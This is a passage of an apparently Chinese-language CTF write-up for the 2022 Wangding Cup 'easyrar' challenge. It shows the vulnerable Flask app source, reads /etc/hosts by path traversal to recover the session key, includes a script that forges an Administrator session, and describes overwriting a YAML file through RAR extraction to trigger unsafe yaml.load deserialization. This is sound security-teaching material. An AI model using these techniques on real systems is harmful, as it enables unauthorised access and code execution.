ck:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+  
+    <style>.toc{background-color:#f5f5f5;margin:0 auto;width:90%;border-radius:8px;padding:20px;box-shadow:0 4px 6px rgba(0,0,0,.1)}.toc ul{padding-left:20px}.toc li{line-height:1.6;margin-bottom:0}.toc li a{color:#333}.toc li a:hover{color:#000}.toc details{cursor:pointer}.toc summary{font-weight:700}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;padding-bottom:0;font-size:16px;max-height:83vh;overflow-y:auto}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya-明烛天南">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/books/" target="_self">Books</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/friends/" target="_self">Friends</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2022网鼎杯青龙组	easyrar</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2022-09-09 00:00:00 UTC">
+                09 Sep 2022
+              </time>
+              
+            </div>
+            
+            <div class="col-xs-6">
+
+              
+              <div class="post-author">
+              <span id="busuanzi_container_page_pv">@本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+                
+            </div>
+          </div>
+          
+        </header>
+        
+
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#easyrar" aria-label="easyrar">easyrar</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        
+
+
+
+        <div class="post-content markdown-body">
+          
+          <h2 id="easyrar">easyrar</h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> yaml
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> hashlib <span style="color:#ff6ac1">import</span> md5
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> flask <span style="color:#ff6ac1">import</span> Flask, render_template, make_response, send_file, request, redirect, session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#ff6ac1">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#ff6ac1">.</span>config[<span style="color:#5af78e">&#39;SECRET_KEY&#39;</span>] <span style="color:#ff6ac1">=</span> socket<span style="color:#ff6ac1">.</span>gethostname()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">response</span>(content, status):
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff6ac1">=</span> make_response(content, status)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.before_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">is_login</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> request<span style="color:#ff6ac1">.</span>path <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;/upload&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;user&#39;</span>) <span style="color:#ff6ac1">!=</span> <span style="color:#5af78e">&#34;Administrator&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href=&#39;/&#39;&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/&#39;</span>, methods<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;user&#39;</span>):
+</span></span><span style="display:flex;"><span>        session[<span style="color:#5af78e">&#39;user&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;Guest&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> render_template(<span style="color:#5af78e">&#39;index.html&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#34;Not Found.&#34;</span>, <span style="color:#ff9f43">404</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">finally</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>:
+</span></span><span style="display:flex;"><span>            updir <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;static/uploads/&#39;</span> <span style="color:#ff6ac1">+</span> md5(request<span style="color:#ff6ac1">.</span>remote_addr<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;updir&#39;</span>):
+</span></span><span style="display:flex;"><span>                session[<span style="color:#5af78e">&#39;updir&#39;</span>] <span style="color:#ff6ac1">=</span> updir
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(updir):
+</span></span><span style="display:flex;"><span>                os<span style="color:#ff6ac1">.</span>makedirs(updir)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#39;Internal Server Error.&#39;</span>, <span style="color:#ff9f43">500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/&lt;path:file&gt;&#39;</span>, methods<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">download</span>(file):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;updir&#39;</span>):
+</span></span><span style="display:flex;"><span>        basedir <span style="color:#ff6ac1">=</span> session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;updir&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>:
+</span></span><span style="display:flex;"><span>            path <span style="color:#ff6ac1">=</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(basedir, file)<span style="color:#ff6ac1">.</span>replace(<span style="color:#5af78e">&#39;../&#39;</span>, <span style="color:#5af78e">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>isfile(path):
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">return</span> send_file(path)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#34;Not Found.&#34;</span>, <span style="color:#ff9f43">404</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#34;Failed.&#34;</span>, <span style="color:#ff9f43">500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/upload&#39;</span>, methods<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#39;GET&#39;</span>, <span style="color:#5af78e">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">upload</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> request<span style="color:#ff6ac1">.</span>method <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> redirect(<span style="color:#5af78e">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> request<span style="color:#ff6ac1">.</span>method <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        uploadFile <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>files[<span style="color:#5af78e">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>        filename <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>files[<span style="color:#5af78e">&#39;file&#39;</span>]<span style="color:#ff6ac1">.</span>filename
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> re<span style="color:#ff6ac1">.</span>search(<span style="color:#5af78e">r</span><span style="color:#5af78e">&#34;\.\.|/&#34;</span>, filename, re<span style="color:#ff6ac1">.</span>M<span style="color:#ff6ac1">|</span>re<span style="color:#ff6ac1">.</span>I) <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;&lt;script&gt;alert(&#39;Hacker!&#39;);window.location.href=&#39;/upload&#39;&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        filepath <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;updir&#39;</span>)<span style="color:#5af78e">}</span><span style="color:#5af78e">/</span><span style="color:#5af78e">{</span>md5(filename<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>hexdigest()<span style="color:#5af78e">}</span><span style="color:#5af78e">.rar&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(filepath):
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&lt;script&gt;alert(&#39;The </span><span style="color:#5af78e">{</span>filename<span style="color:#5af78e">}</span><span style="color:#5af78e"> file has been uploaded&#39;);window.location.href=&#39;/display?file=</span><span style="color:#5af78e">{</span>filename<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>            uploadFile<span style="color:#ff6ac1">.</span>save(filepath)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        extractdir <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>session<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;updir&#39;</span>)<span style="color:#5af78e">}</span><span style="color:#5af78e">/</span><span style="color:#5af78e">{</span>filename<span style="color:#ff6ac1">.</span>split(<span style="color:#5af78e">&#39;.&#39;</span>)[<span style="color:#ff9f43">0</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(extractdir):
+</span></span><span style="display:flex;"><span>            os<span style="color:#ff6ac1">.</span>makedirs(extractdir)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        pStatus <span style="color:#ff6ac1">=</span> subprocess<span style="color:#ff6ac1">.</span>Popen([<span style="color:#5af78e">&#34;/usr/bin/unrar&#34;</span>, <span style="color:#5af78e">&#34;x&#34;</span>, <span style="color:#5af78e">&#34;-o+&#34;</span>, filepath, extractdir])
+</span></span><span style="display:flex;"><span>        t_beginning <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()  
+</span></span><span style="display:flex;"><span>        seconds_passed <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">0</span>
+</span></span><span style="display:flex;"><span>        timeout<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">60</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">while</span> <span style="color:#ff6ac1">True</span>:  
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> pStatus<span style="color:#ff6ac1">.</span>poll() <span style="color:#ff6ac1">is</span> <span style="color:#ff6ac1">not</span> <span style="color:#ff6ac1">None</span>:  
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">break</span>  
+</span></span><span style="display:flex;"><span>            seconds_passed <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time() <span style="color:#ff6ac1">-</span> t_beginning  
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> timeout <span style="color:#ff6ac1">and</span> seconds_passed <span style="color:#ff6ac1">&gt;</span> timeout:  
+</span></span><span style="display:flex;"><span>                pStatus<span style="color:#ff6ac1">.</span>terminate()  
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">raise</span> TimeoutError(cmd, timeout)
+</span></span><span style="display:flex;"><span>            time<span style="color:#ff6ac1">.</span>sleep(<span style="color:#ff9f43">0.1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        rarDatas <span style="color:#ff6ac1">=</span> {<span style="color:#5af78e">&#39;filename&#39;</span>: filename, <span style="color:#5af78e">&#39;dirs&#39;</span>: [], <span style="color:#5af78e">&#39;files&#39;</span>: []}
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> dirpath, dirnames, filenames <span style="color:#ff6ac1">in</span> os<span style="color:#ff6ac1">.</span>walk(extractdir):
+</span></span><span style="display:flex;"><span>            relative_dirpath <span style="color:#ff6ac1">=</span> dirpath<span style="color:#ff6ac1">.</span>split(extractdir)[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>]
+</span></span><span style="display:flex;"><span>            rarDatas[<span style="color:#5af78e">&#39;dirs&#39;</span>]<span style="color:#ff6ac1">.</span>append(relative_dirpath)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">for</span> file <span style="color:#ff6ac1">in</span> filenames:
+</span></span><span style="display:flex;"><span>                rarDatas[<span style="color:#5af78e">&#39;files&#39;</span>]<span style="color:#ff6ac1">.</span>append(os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(relative_dirpath, file)<span style="color:#ff6ac1">.</span>split(<span style="color:#5af78e">&#39;./&#39;</span>)[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#39;fileinfo/</span><span style="color:#5af78e">{</span>md5(filename<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>hexdigest()<span style="color:#5af78e">}</span><span style="color:#5af78e">.yaml&#39;</span>, <span style="color:#5af78e">&#39;w&#39;</span>) <span style="color:#ff6ac1">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#ff6ac1">.</span>write(yaml<span style="color:#ff6ac1">.</span>dump(rarDatas))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> redirect(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#39;/display?file=</span><span style="color:#5af78e">{</span>filename<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/display&#39;</span>, methods<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">display</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    filename <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>args<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;file&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> filename:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#34;Not Found.&#34;</span>, <span style="color:#ff9f43">404</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#39;fileinfo/</span><span style="color:#5af78e">{</span>md5(filename<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>hexdigest()<span style="color:#5af78e">}</span><span style="color:#5af78e">.yaml&#39;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#39;fileinfo/</span><span style="color:#5af78e">{</span>md5(filename<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>hexdigest()<span style="color:#5af78e">}</span><span style="color:#5af78e">.yaml&#39;</span>, <span style="color:#5af78e">&#39;r&#39;</span>) <span style="color:#ff6ac1">as</span> f:
+</span></span><span style="display:flex;"><span>            yamlDatas <span style="color:#ff6ac1">=</span> f<span style="color:#ff6ac1">.</span>read()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> re<span style="color:#ff6ac1">.</span>search(<span style="color:#5af78e">r</span><span style="color:#5af78e">&#34;apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}&#34;</span>, yamlDatas, re<span style="color:#ff6ac1">.</span>M<span style="color:#ff6ac1">|</span>re<span style="color:#ff6ac1">.</span>I):
+</span></span><span style="display:flex;"><span>                rarDatas <span style="color:#ff6ac1">=</span> yaml<span style="color:#ff6ac1">.</span>load(yamlDatas<span style="color:#ff6ac1">.</span>strip()<span style="color:#ff6ac1">.</span>strip(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#39;</span><span style="color:#5af78e">\x00</span><span style="color:#5af78e">&#39;</span><span style="color:#ff6ac1">.</span>decode()))
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">if</span> rarDatas:
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">return</span> render_template(<span style="color:#5af78e">&#39;result.html&#39;</span>, filename<span style="color:#ff6ac1">=</span>filename, path<span style="color:#ff6ac1">=</span>filename<span style="color:#ff6ac1">.</span>split(<span style="color:#5af78e">&#39;.&#39;</span>)[<span style="color:#ff9f43">0</span>], files<span style="color:#ff6ac1">=</span>rarDatas[<span style="color:#5af78e">&#39;files&#39;</span>])
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#39;Internal Server Error.&#39;</span>, <span style="color:#ff9f43">500</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#39;Forbidden.&#39;</span>, <span style="color:#ff9f43">403</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> response(<span style="color:#5af78e">&#34;Not Found.&#34;</span>, <span style="color:#ff9f43">404</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#ff6ac1">.</span>run(host<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;0.0.0.0&#39;</span>, port<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">8888</span>)
+</span></span></code></pre></div><p>首先我们要上传文件，这里有session验证，且key为<code>socket.gethostname()</code>，在<code>/</code>路由有目录穿越可以读文件，读一下<code>/etc/hosts</code></p>
+<p><img alt="image-20220826163240481" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220826163240481.png"></p>
+<p>也就是说密钥是<code>engine-1</code>，用jwt.io伪造session有问题，本地起一个flask</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> flask <span style="color:#ff6ac1">import</span> Flask,session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#ff6ac1">=</span> Flask(__name__,template_folder<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#ff6ac1">.</span>config[<span style="color:#5af78e">&#39;SECRET_KEY&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;engine-1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/&#39;</span>,methods<span style="color:#ff6ac1">=</span>[<span style="color:#5af78e">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">main</span>():
+</span></span><span style="display:flex;"><span>    session[<span style="color:#5af78e">&#39;updir&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;./&#34;</span>
+</span></span><span style="display:flex;"><span>    session[<span style="color:#5af78e">&#39;user&#39;</span>] <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;Administrator&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;ok&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#ff6ac1">.</span>run(host<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;0.0.0.0&#39;</span>,port<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">8889</span>)
+</span></span></code></pre></div><p>之后便可以成功上传文件，接下来审计代码逻辑，这里<code>yaml.load</code>可以造成反序列化那么我们的目的是覆盖yaml文件</p>
+<p>将rar文件名更改为<code>fileinfo.rar</code>，压缩包内是内容为反序列化payload文件名为<code>fileinfo.rar</code>的md5的yaml文件</p>
+<p>第一次上传了一个fileinfo.rar之后会在fileinfo下生成yaml文件，之后会生成一个同名yaml文件将这个yaml文件覆盖</p>
+<p>第二次时将<code>fileinfo.rar</code>更名为<code>fileinfo.rarb</code>再上传，此时会覆盖原来yaml文件，且新生成的yaml文件不会覆盖</p>
